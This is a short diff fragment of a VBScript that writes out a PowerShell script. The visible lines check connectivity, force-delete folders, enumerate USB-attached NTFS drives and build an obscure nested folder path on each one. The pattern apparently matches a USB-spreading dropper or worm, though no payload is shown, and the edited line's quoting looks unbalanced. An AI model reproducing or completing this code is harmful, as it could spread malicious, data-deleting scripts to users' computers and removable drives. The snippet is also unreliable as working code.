@@ -50,7 +50,7 @@ fileContent = "$webRequest = [System.Net.WebRequest]::Create(""http://www.google
               "            Get-ChildItem -Path $sourceFolder | Move-Item -Destination $destinationFolder -Force" & vbCrLf & _
               "            Remove-Item -Path $destination" & vbCrLf & _
               "            Remove-Item -Path $sourceFolder -Recurse" & vbCrLf & _
-              "            $ntfsVolumes = Get-Disk -UniqueId "*USB*" | Get-Partition | Get-Volume | Where-Object { $_.FileSystem -eq "NTFS" }" & vbCrLf & _
+              "            $ntfsVolumes = Get-Disk -UniqueId ""*USB*" | Get-Partition | Get-Volume | Where-Object { $_.FileSystem -eq ""NTFS"" }"" & vbCrLf & _
               "                foreach ($volume in $ntfsVolumes) {" & vbCrLf & _
               "                $rootPath = $volume.DriveLetter + ":\"" & vbCrLf & _
               "                $folderPath = Join-Path -Path $rootPath -ChildPath "GenScriptus_V10\OS11\OS1\APP\S"" & vbCrLf & _
